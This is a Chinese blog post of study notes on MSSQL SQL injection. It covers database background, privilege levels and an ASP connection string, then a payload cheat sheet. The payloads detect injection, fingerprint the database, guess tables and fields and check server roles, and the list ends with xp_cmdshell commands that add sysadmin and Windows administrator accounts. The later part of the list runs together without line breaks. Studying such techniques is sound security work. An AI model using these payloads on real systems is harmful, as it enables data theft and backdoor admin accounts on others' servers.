---
layout:     post
title:      Web笔记（二）SQL注入之Mssql
subtitle:   这个系列是整理学习安全的笔记，包括Web和PWN的一些知识。本章是Mssql的SQL注入。
date:       2020-11-29
author:     HouKC
header-img: img/post-bg-rwd.jpg
catalog:    true
tags:
    - CTF
    - web
    - 网络安全
    - 学习笔记
    - SQL注入
    - Mssql
---



## 0x00 Mssql简介

Mssql，又称SQL Server，全称为Microsoft SQL Server，是美国Microsoft公司推出的一种关系型数据库系统，是一个可扩展的、高性能的、为分布式客户机/服务器计算所设计的数据库管理系统，实现了与WindowsNT的有机结合，提供了基于事务的企业级信息管理系统方案。

主要特点如下：

- 高性能设计，可充分利用WindowsNT的优势。
- 系统管理先进，支持Windows图形化管理工具，支持本地和远程的系统管理和配置。
- 强壮的事务处理功能，采用各种方法保证数据的完整性。
- 支持对称多处理器结构、存储过程、ODBC，并具有自主的SQL语言。Mssql以其内置的数据复制功能、强大的管理工具、与Internet的紧密集成和开放的系统结构为广大的用户、开发人员和系统集成商提供了一个出众的数据库平台。



## 0x01 Mssql常用场景

- 学校
- 政府
- OA
- 棋牌游戏
- 人事考试网站

asp/aspx+sqlserver



## 0x02 Mssql知识

#### 1.Mssql服务、端口、后缀

- 重启服务，使其生效。

- 命令：services.msc

  TCP  0.0.0.0:1433  0.0.0.0:0  LISTENING

- 1433端口是开启的，当我们关闭服务后，端口也将关闭。

- 后缀是xxx.mdf

- 日志文件后缀是xxx_log.ldf

- 数据库服务器系统级权限账号sa

#### 2. 数据库权限

- sa权限：数据库操作，文件管理，命令执行，注册表读取等system

- db权限：文件管理，数据库操作等users-administrators

- public权限：数据库操作guest-users



## 0x03 调用数据库代码

```asp
	<%
set conn = server.createobject("adodb.connection")
conn.open "provider=sqloledb;source=local;uid=sa;pwd=*****;database=database-name"
%>
```
其中，provider后面的不用管，照写；source后面的是IP地址，这里是本地；sa是内置的用户，密码是在安装时设置的；database后面的是要连接的数据库名称，如：mydatabase（不需要扩展名）

一般这段代码会在以下文件中存在：

- conn.asp

- dbconfig.asp

如果是aspx则可能在：

- web.config



## 0x04 注入语句

#### 1. 判断是否有注入

```
and 1=1
and 1=2
/
-0
```

#### 2. 初步判断是否是mssql

```
and user>0		# 如果正常就是Mssql
```

#### 3. 判断数据库系统

```
and (select count(*) from sysobjects)>0      mssql
and (select count(*) from msysobjects)>0    access
```

如果上述语句正常，则可能是sa权限4) 注入参数是字符'and [查询条件] and '' = '5) 搜索时没过滤参数的'and [查询条件] and '%25'='6) 猜数表名and (select count(*) from [表名])>07) 猜字段and (select count([字段名]) from [表名])>08) 猜字段中记录长度and (select top 1 len([字段名]) from [表名])>09) 猜字段的ascii值and (select top 1 asc(mid([字段名], 1, 1)) from [表名])>0             accessand (select top 1 unicode(substring([字段名], 1, 1)) from [表名])>0     mssql10)测试权限结构（mssql）and 1=(select IS_SRVROLEMEMBER('sysadmin'));--and 1=(select IS_SRVROLEMEMBER('serveradmin'));--and 1=(select IS_SRVROLEMEMBER('setupadmin'));--and 1=(select IS_SRVROLEMEMBER('securityadmin'));--and 1=(select IS_SRVROLEMEMBER('diskadmin'));--and 1=(select IS_SRVROLEMEMBER('bulkadmin'));--and 1=(select IS_SRVROLEMEMBER('db_owner'));--11) 添加mssql和系统的账户exec master.dbo.sp_addlogin username;--exec master.dbo.sp_password null,username,password;--exec master.dbo.sp_addsrvrolemember sysadmin username;--exec master.dbo.xp_cmdshell 'net user username password /workstations:* /times:all /passwordchg:yes /passwordreq:yes /active:yes /add';--exec master.dbo.xp_cmdshell 'net user username password /add';--exec master.dbo.xp_cmdshell 'net localgroup administrators username /add';--